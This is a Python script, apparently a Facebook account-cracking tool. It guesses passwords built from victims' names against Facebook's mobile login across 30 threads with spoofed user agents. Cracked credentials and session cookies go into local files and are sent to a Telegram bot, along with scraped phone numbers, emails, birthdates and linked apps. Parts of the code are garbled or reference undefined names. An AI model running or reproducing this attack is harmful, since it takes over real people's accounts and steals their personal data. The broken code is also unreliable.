_d,_CT,_CU,_b,_N,_CV,_A0,_n,_CW,_Q,_CX,_CY,_CZ,_Ca,_Cb,_z,_Cc,_Cd,_Ce,_Cf,_Cg,_Ch,_Ci,_A1,_P,_Cj,_Ck,_Cl,_Cm,_Cn,_A6,_Co,_l,_y,_Cp,_i,_Cq,_A5,_A8,_Cr,_Cs,_Ct,_Cu,_Cv,_Cw,_Cx,_Cy,_e,_Cz,_C_,_A8,_D0,_D1,_D2,_D3,_r,_D4,_D5,_A4,_D6,_q,_D7,_D8,_D9,_DA,_DB,_A7,_DC]
SDM=''
cokbrut=[]
ses=requests.Session()
princp=[]
_G='Y'
_C='1'
for xd in range(10000):a='Nokia5350/10.1.011 (SymbianOS/10;';b=random.randrange(1,9);c=random.randrange(1,9);d='Series63/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1)';e=random.randrange(100,9999);f='AppleWebKit/525 (KHTML, like Gecko)';g=random.randrange(1,9);h=random.randrange(1,4);i=random.randrange(1,4);j=random.randrange(1,4);k='Safari/525 3gpp-gba';uaku=f"{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}";ugen2.append(uaku);aa='NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (SymbianOS/9.2; U;';b=random.choice(['7.0',_AD,'9',_T,_U,_V]);c=random.choice(['Series60/3.1 NokiaE71-1/100.07.57; Profile/MIDP-2.0 Configuration/CLDC-1.1 )']);d=random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X',_G,'Z']);e=random.randrange(1,999);f=random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X',_G,'Z']);g='AppleWebKit/413 (KHTML, like Gecko)';h=random.randrange(80,103);i='0';j=random.randrange(4200,4900);k=random.randrange(40,150);l='Safari/413 UNTRUSTED/1.0';uaku2=f"{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}";ugen.append(uaku2);aa='NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 12;';b=random.choice(['7.0',_AD,'9',_T,_U,_V]);c=random.choice(['SAMSUNG SM-X906B)']);d=random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X',_G,'Z']);e=random.randrange(1,999);f=random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X',_G,'Z']);g='AppleWebKit/537.36 (KHTML, like Gecko)';h=random.randrange(80,103);i='0';j=random.randrange(4200,4900);k=random.randrange(40,150);l='Chrome/100.0.4896.88 Safari/537.36 UNTRUSTED/1.0';uaku2=f"{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}";ugen.append(uaku2);aa='NokiaC1-01/2.0 (06.15) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US;';b=random.choice(['7.0',_AD,'9',_T,_U,_V]);c=random.choice(['nokiac1-01)']);d=random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X',_G,'Z']);e=random.randrange(1,999);f=random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X',_G,'Z']);g='U2/1.0.0 UCBrowser/8.9.0.251';h=random.randrange(80,103);i='0';j=random.randrange(4200,4900);k=random.randrange(40,150);l='U2/1.0.0 Mobile UNTRUSTED/1.06';uaku2=f"{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}";ugen.append(uaku2)
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni=[],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
P=_AB
M=_DD
H=_DE
K='\x1b[1;93m'
B='\x1b[1;94m'
U='\x1b[1;95m'
O=_DF
N='\x1b[0m'
Z=_W
sir='\x1b[41m\x1b[1;97m'
x='\x1b[m'
m=_DD
k='\x1b[93m'
h=_DE
hh='\x1b[32m'
u='\x1b[95m'
kk='\x1b[33m'
b=_DF
p='\x1b[0;34m'
AB_A=_AB
RS='\x1b[30m'
AH_F='\x1b[31m'
AKH_F='\x1b[32m'
AS_T='\x1b[33m'
SM='\x1b[34m'
BN='\x1b[35m'
AZ_T='\x1b[36m'
AB_KH='\x1b[37m'
AH_T='\x1b[91m'
AKH_T='\x1b[92m'
AS_F='\x1b[93m'
WR='\x1b[95m'
p=_AA
AH2='\x1b[38;5;204m'
AS2=_AG
MJ='\x1b[38;5;193m'
MJ2=_AH
MJ3='\x1b[38;5;190m'
O='\x1b[0;96m'
P=_AI
J=_AA
MJ4='\x1b[38;5;106m'
asu=random.choice([m,O,h,u,b,MJ3,MJ2,MJ,AS2,AH2,B,WR,AS_F,AKH_T,AH_T,AB_KH,AZ_T,BN,SM,AS_T,AKH_F,AH_F,RS,AB_A,Z,p,b,kk,hh,x,Y,P,u,B,J,MJ4,p])
header_grup={_A9:'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'}
dic={_C:'jan','2':'feb','3':'mar','4':'apr','5':'may','6':'jun','7':'jul','8':'aug','9':'sep',_T:'oct',_U:'nov',_V:'dec'}
dic2={_C:'jan','2':'feb','3':'mar','4':'apr','5':'may','6':'jun','7':'jul','8':'aug','9':'sep',_T:'oct',_U:'nov',_V:'dec'}
ua='Mozilla/5.0 (Linux; Android 10; LIO-N29; HMSCore 6.4.0.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.0.1.302 Mobile Safari/537.3'
tgl=datetime.datetime.now().day
bln=dic[str(datetime.datetime.now().month)]
thn=datetime.datetime.now().year
okc='OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc='CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#-----------------[ اتصالات ]--------------
asu = random.choice([
    m,
    k,
    h,
    u,
    b])
dic = {
    '1': 'January',
    '2': 'February',
    '3': 'March',
    '4': 'April',
    '5': 'May',
    '6': 'June',
    '7': 'July',
    '8': 'August',
    '9': 'September',
    '10': 'October',
    '11': 'November',
    '12': 'December' }
dic2 = {
    '01': 'January',
    '02': 'February',
    '03': 'March',
    '04': 'April',
    '05': 'May',
    '06': 'June',
    '07': 'July',
    '08': 'August',
    '09': 'September',
    '10': 'October',
    '11': 'November',
    '12': 'Devember' }
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
M = '\x1b[1;91m'
O = '\x1b[1;96m'
N = '\x1b[0m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
logo = ('®©'*30)
def clear():
    os.system('clear')


def RAJY0():
    ip = requests.get('https://api.ipify.org').text
    gep = requests.get('http://ipinfo.io/json').json()
    os.system('clear')
    print(('\033[92m—'*25)+'\n• BY : SAIF | @PYTPT •\n'+('—'*25))
    print(('—'*25)+'\n• BY Programming SAIF •\n'+('—'*25))
    print(L + logo)
    print(L + 'RAJY')
    print(('—'*25)+'\n• BY Programming SAIF •\n'+('—'*25))
    print('')
    _____RAJY_____ = '1'
    if _____RAJY_____ in ('1',):
        RAJY()


def rajy():
    try:
        na = webbrowser.open('https://t.me/PYT_T')
    except:
        exit()



def RAJY():
    
    try:
        print('')
        fileX = input(f'''{L}حط اسم او مسار الملف {M}:{H} ''')
        for line in open(fileX, 'r').readlines():
            id.append(line.strip())
        setting()
        clear()
        print(M + logo)
        print(L + '✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮')
        print(f'''>> ID : {h}''' + str(len(id)))
        time.sleep(3)
    except:
        exit(f'''\n{M}File %s لم يتم العثور على ملف بهاذا المسار''' % fileX)



def setting():
    hu = '1'
    if hu in ('3', '03'):
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ('2', '02'):
        muda = []
        for bacot in sorted(id):
            muda.append(bacot)
        bcm = len(muda)
        bcmi = bcm - 1
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -= 1
    elif hu in ('1', '01'):
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)
    else:
        print('>> PILIH YANG BENAR BANG ')
        exit()
    hc = '1'
    if hc in ('1', '01'):
        method.append('mobile')
    elif hc in ('',):
        print('>> PILIH YANG BENAR BANG ')
        setting()
    _jembot_ = '2'
    if _jembot_ in ('',):
        print('>> Pilih Yang Bener Kontol ')
        back()
    elif _jembot_ in ('2', '2'):
        taplikasi.append('ya')
    else:
        taplikasi.append('no')
    pwplus = '1'
    if pwplus in ('2', '2'):
        pwpluss.append('ya')
        cetak(nel('[[cyan]•[green]] يمكنك وضع باسورد واحد فقط\n[[cyan]•[green]] Contoh :[green] 123456qwerty[green] '))
        pwku = input('>>ادخل الباسورد : ')
        pwkuh = pwku.split(',')
        for xpw in pwkuh:
            pwnya.append(xpw)
    else:
        pwpluss.append('no')
        passwrd()


def passwrd():
    clear()
    print(M + logo)
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf = yuzong.split('|')[0]
            nmf = yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf) < 6:
                if len(frs) < 3:
                    pass
                else:
                    pwv.append(nmf)
                    pwv.append(frs+'321')
                    pwv.append(frs+'54321')
                    pwv.append('123'+frs)
                    pwv.append('1234'+frs)
                    pwv.append('12345'+frs)
                    pwv.append(frs+'123456') 
                    pwv.append(frs+'1212')
                    pwv.append(frs+'12344321')
                    pwv.append(frs+'123321')
                    pwv.append(frs+'12341234')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@1234')
                    pwv.append(frs+'@12345')
                    pwv.append(frs+'@123456')
                    pwv.append(frs+'2006')
                    pwv.append(frs+'123123')
                    pwv.append(frs+'1990')
                    pwv.append(frs+'112233')
                    pwv.append(frs+'22334455')
                    pwv.append(frs+'223344')
                    pwv.append(frs+'123456789')
                    pwv.append(frs+'1234567890')
                    pwv.append(frs+'2015')
                    pwv.append(frs+'2016')
                    pwv.append(frs+'2017')
                    pwv.append(frs+'2018')
                    pwv.append(frs+'2019')
                    pwv.append(frs+'2020')
                    pwv.append(frs+'2021')
                    pwv.append(frs+'2022')
                    pwv.append(frs+'12')
                    pwv.append(frs+'2000')
                    pwv.append(frs+'2001')
                    pwv.append(frs+'2002')
                    pwv.append(frs+'2003')
                    pwv.append(frs+'2004')
                    pwv.append(frs+'2005')
                    pwv.append(frs+'01')
                    pwv.append(frs+'1234567')
                    pwv.append(frs+'12345678')
                    pwv.append(frs+'2007')
                    pwv.append(frs+'123123123')
                    pwv.append(frs+'11')
                    pwv.append('00998877')
                    pwv.append('009988')
                    pwv.append('99887766')
                    pwv.append('998877')
                    pwv.append('١٢٣٤٥٦')
                    pwv.append('١٢٣٤٥٦٧٨٩')
                    pwv.append('12345@12345')
                    pwv.append('12345@')
                    pwv.append('19901990')
                    pwv.append('19911991')
                    pwv.append('19921992')
                    pwv.append('19931993')
                    pwv.append('19941994')
                    pwv.append('19951995')
                    pwv.append('112233445566')
                    pwv.append('1122334455')
                    
            elif len(frs) < 3:
                pwv.append(nmf)
            else:
                pwv.append(nmf)
                pwv.append(frs+'1234512345')
                pwv.append(frs+'1122334455')
                pwv.append(frs+'0011')
                pwv.append(frs+'00112233')
                pwv.append(frs+'123123')
                pwv.append(frs+'123321')
                pwv.append(frs+'123123123')
                pwv.append(frs+'1000')
                pwv.append(frs+'12345')
                pwv.append(frs+'112233')
                pwv.append(frs+'12341234')
                pwv.append(frs+'12345678')
                pwv.append(frs+'11223344')
                pwv.append(frs+'1122334455')
                pwv.append(frs+'112233445566')
                pwv.append(frs+'123')
                pwv.append(frs+'1234')
                pwv.append(frs+'2022')
                pwv.append(frs+'112233')
                pwv.append('123first123')
                pwv.append('1234first1234')
                pwv.append('12345first12345')
                pwv.append('first12last')
                pwv.append('first123last')
                pwv.append('first1234last')
                pwv.append('first12345last')
                
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            if 'mobile' in method:
                pool.submit(crack, idf, pwv)
                continue
            if 'free' in method:
                pool.submit(crackfree, idf, pwv)
                continue
            if 'touch' in method:
                pool.submit(cracktouch, idf, pwv)
                continue
            if 'mbasic' in method:
                pool.submit(crackmbasic, idf, pwv)
            else:
                pool.submit(crackmbasic, idf, pwv)
    print('\n')
    print(('\033[92m—'*25)+'\n• BY : SAIF | @PYTPT •\n'+('—'*25))
    print('DONE RAJY')
    print('BY SAIF')
    

def crack(idf, pwv):
    
    global cp, ok, ok, loop
    bi = random.choice([u,k,kk,b,h,hh])
    pers = loop * 100 / len(id2)
    rc = random.choice
    ya = rc(['😀','😃','😄','😁','😆','😅','🤣','😂','🙂','🙃','😉','😊','😇','🥰','😍','🤩','😘','😗','😚','😙','😋','😛','😜','🤪','😝','🤑','🤗','🤭','🤫','🤔','🤐','🤨','😐','😑','😶','😏','😒','🙄','😬','🤥','😌','😔','😪','🤤','😴','😷','🤒','🤕','🤢','🤮','🤧','🥵','🥶','🥴','😵','🤯','🤠','🥳','😎','🤓','🧐','😕','😟','🙁','☹️','😮','😯','😲','😳','🥺','😦','😧','😨','😰','😥','😢','😭','😱','😖','😣','😞','😓','😩','😫','🥱','😤','😡','😠','🤬','😈','👿','💀','☠️','💩','🤡','👹','👺','👻','👽','👾','🤖','😺','😸','😹','😻','😼','😽','🙀','😿','😾','🧡','💛','💚','💙','💜','🖤','🤍','🤎','❤️','🧡','💛','💚','💙','💜','🖤','🤍','🤎','❣️','💕','💞','💓','💗','💖','💘','💝','💟','❤️\u200d🔥','❤️\u200d🩹','❤️','🚀','🛸','🌍','🌎','🌏','💔','✈️','🦦','🔥','👌🏼','👋🏼','🌚','🔞','🙆\u200d♂️','🤦\u200d♂️','✨','🗿','👍🏼','🚬'])
    fff = '%'
    
    print(f'''\r\n\033[92m[ BY SAIF] %s{ya}[𝑺𝑨𝑰𝑭] %s/%s ➙ [OK]=%s ➙[CP]=%s | %s%s%s{ya}''' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x), end=' ')
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        
        try:
            tix = time.time()
            ses.headers.update({
                'Host': 'm.facebook.com',
                'upgrade-insecure-requests': '1',
                'user-agent': ua2,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'dnt': '1',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-user': 'empty',
                'sec-fetch-dest': 'document',
                'referer': 'https://m.facebook.com/',
                'accept-encoding': 'gzip, deflate br',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' })
            p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
            dataa = {
                'lsd': re.search('name="lsd" value="(.*?)"', str(p)).group(1),
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
                'uid': idf,
                'flow': 'login_no_pin',
                'pass': pw,
                'next': 'https://developers.facebook.com/tools/debug/accesstoken/' }
            ses.headers.update({
                'Host': 'm.facebook.com',
                'cache-control': 'max-age=0',
                'upgrade-insecure-requests': '1',
                'origin': 'https://m.facebook.com',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': ua,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-user': 'empty',
                'sec-fetch-dest': 'document',
                'referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',
                'accept-encoding': 'gzip, deflate br',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' })
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, allow_redirects=False)
            if 'checkpoint' in po.cookies.get_dict().keys():
                if 'ya' in oprek:
                    akun.append(idf + '|' + pw)
                    ceker(idf, pw)
                else:
                    print('\n')
                    statuscp = f''' BY @PYTPT\n𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞❌

->> ID : ﷽ - ايدي : {idf}\n
->> PASS: ﷽ - كلمة المرور  : {pw}\n

♥≈ＵＲＬ＝https://www.facebook.com/profile.php?id={idf}

⌯ - 𝗖𝗢𝗢𝗞𝗜𝗘𝗦   ¦ \n {kuki} 					
					'''
                    statuscp1 = nel(statuscp, style='red')
                    cetak(nel(statuscp1, title='CP'))
                    open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                    akun.append(idf + '|' + pw)
                    cp += 1
                    requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(statuscp))
            
            if 'c_user' in ses.cookies.get_dict().keys():
                headapp = {
                    'user-agent': 'NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+' }
                if 'no' in taplikasi:
                    ok += 1
                    coki = po.cookies.get_dict()
                    kuki = ';'.join([f"{key}={value}" for key, value in ses.cookies.get_dict().items()])
                    open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                    print('\n')
                    statusok = f'''DECODED BY @PYTPT\n𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊

->> ID : ﷽ - ايدي  :  {idf}\n
->> PASS: ﷽ - كلمة المرور  : {pw}\n

♥≈ＵＲＬ＝https://www.facebook.com/profile.php?id={idf}

⌯ - 𝗖𝗢𝗢𝗞𝗜𝗘𝗦   ¦ \n {kuki}					
					'''
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title='OK'))
                    requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(statusok))
                    cek_SDMVIP(kuki)
            
    
                if 'ya' in taplikasi:
                    ok += 1
                    coki = po.cookies.get_dict()
                    kuki = ';'.join([f"{key}={value}" for key, value in ses.cookies.get_dict().items()])
                    open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                    user = idf
                    infoakun = ''
                    session = requests.Session()
                    get_id = session.get('https://m.facebook.com/profile.php', cookies=coki, headers=headapp).text
                    nama = re.findall('\\<title\\>(.*?)<\\/title\\>', str(get_id))[0]
                    response = session.get('https://m.facebook.com/profile.php?v=info', cookies=coki, headers=headapp).text
                    response2 = session.get('https://m.facebook.com/profile.php?v=friends', cookies=coki, headers=headapp).text
                    response3 = session.get(f'''https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_''', cookies=coki, headers=headapp).text
                    response4 = session.get(f'''https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr''', cookies=coki, headers=headapp).text
                    
                    try:
                        nomer = re.findall('\\<a\\ href\\="tel\\:\\+.*?">\\<span\\ dir\\="ltr">(.*?)<\\/span><\\/a>', str(response))[0]
                    except:nomer = ''
                    
                    try:
                        email = re.findall('\\<a href\\="https\\:\\/\\/lm\\.facebook\\.com\\/l\\.php\\?u\\=mail.*?" target\\=".*?"\\>(.*?)<\\/a\\>', str(response))[0].replace('&#064;', '@')
                    except:email = ''
                    
                    try:
                        ttl = re.findall('\\<\\/td\\>\\<td\\ valign\\="top" class\\=".*?"\\>\\<div\\ class\\=".*?"\\>(\\d+\\s+\\w+\\s+\\d+)<\\/div\\>\\<\\/td\\>\\<\\/tr\\>', str(response))[0]
                    except:ttl = ''
                    
                    try:
                        teman = re.findall('\\<h3\\ class\\=".*?"\\>Teman\\ \\((.*?)\\)<\\/h3\\>', str(response2))[0]
                    except:teman = ''
                    
                    try:
                        pengikut = re.findall('\\<span\\ class\\=".*?"\\>(.*?)\\<\\/span\\>', str(response4))[1]
                    except:pengikut = ''
                    
                    try:
                        tahun = ''
                        cek_thn = re.findall('\\<div\\ class\\=".*?" id\\="year_(.*?)">', str(response3))
                        for nenen in cek_thn:
                            tahun += nenen + ', '
                    except:pass
                    infoakun += f''' BY @PYTPT\n𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊
؁؁؁؁؁؁؁؁؁

﷽ - ايدي  : {idf}\n❖ - ﷽ - كلمة المرور  : {pw}\n\n❖ - عدد الأصدقاء : {teman}\n❖ - عدد المتابعين : {pengikut}\n❖ - البريد الإلكتروني النشط : {email}\n❖ - الرقم النشط: {nomer}\n❖ - سنة الحساب : {tahun}\n❖ - تاريخ الميلاد : {ttl}\n
••••••••••••••••••••••••••••••••••••••••••••

♥≈ＵＲＬ＝https://www.facebook.com/profile.php?id={idf}

⌯ - 𝗖𝗢𝗢𝗞𝗜𝗘𝗦   ¦ \n {kuki}
 '''
                    requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(infoakun))
                    (hit1, hit2) = (0, 0)
                    cek = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=active', cookies=coki, headers=headapp).text
                    cek2 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=inactive', cookies=coki, headers=headapp).text
                    if 'Diakses menggunakan Facebook' in re.findall('\\<title\\>(.*?)<\\/title\\>', str(cek)):
                        infoakun += 'Aplikasi Yang Terkait*\n'
                        if 'Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau.' in cek:
                            infoakun += 'Tidak Ada Aplikasi Aktif Yang Terkait *\n'
                        else:
                            infoakun += '\tAplikasi Aktif : \n'
                            apkAktif = re.findall('\\/><div\\ class\\=".*?"\\>\\<span\\ class\\=".*?"\\>(.*?)<\\/span\\>', str(cek))
                            ditambahkan = re.findall('\\<div\\>\\<\\/div\\>\\<div\\ class\\=".*?"\\>(.*?)<\\/div\\>', str(cek))
                            for muncul in apkAktif:
                                hit1 += 1
                                infoakun += f'''\t\t[{hit1}] {muncul} {ditambahkan[hit2]}\n'''
                                hit2 += 1
                        if 'Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau' in cek2:
                            infoakun += '\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n'
                        else:
                            (hit1, hit2) = (0, 0)
                            infoakun += '\tAplikasi Kedaluwarsa :\n'
                            apkKadaluarsa = re.findall('\\/><div\\ class\\=".*?"\\>\\<span\\ class\\=".*?"\\>(.*?)<\\/span\\>', str(cek2))
                            kadaluarsa = re.findall('\\<div\\>\\<\\/div\\>\\<div\\ class\\=".*?"\\>(.*?)<\\/div\\>', str(cek2))
                            for muncul in apkKadaluarsa:
                                hit1 += 1
                                infoakun += f'''\t\t[{hit1}] {muncul} {kadaluarsa[hit2]}\n'''
                                hit2 += 1
                    print('\n')
                    statusok = f''' BY @PYTPT\n𝐅𝐀𝐂𝐄𝐁𝐎

->> ID : ﷽ - ايدي  :  {idf}\n
->> PASS: ﷽ - كلمة المرور  : {pw}\n

♥≈ＵＲＬ＝https://www.facebook.com/profile.php?id={idf}

⌯ - 𝗖𝗢𝗢𝗞𝗜𝗘𝗦   ¦ \n {kuki}
⌯ - LINK GAME   ¦ \n {kuki}		
					'''
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title='OK'))
                    requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(statusok))
                    cek_SDMVIP(kuki)
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1


def cek_SDMVIP(kuki):
    session = requests.Session()
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
    sop = bs4.BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    try:
        for i in range(len(game)):
            print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
    except AttributeError:
        print ("\r    %s\033[0m cookie invalid"%(M))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
    sop = bs4.BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    try:
        for i in range(len(game)):
            print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
    except AttributeError:
        print ("\r    %s \033[0mcookie invalid"%(M))
        


if __name__ == '__main__':
    
    try:os.system('git pull')
    except:pass
    
    try:os.mkdir('OK')
    except:pass
    
    try:os.mkdir('CP')
    except:pass
    
    try:os.mkdir('/sdcard/ALVINO-DUMP')
    except:pass
    
    try:os.system('touch .prox.txt')
    except:pass
    
    try:os.system('pkg install play-audio')
    except:pass

    try:os.system('clear')
    except:pass
    RAJY()

    Threads=[] 
for t in range(30):
 x = threading.Thread(target=passwrd)
 x.start()
 Threads.append(x)
for Th in Threads:
 passwrd()
 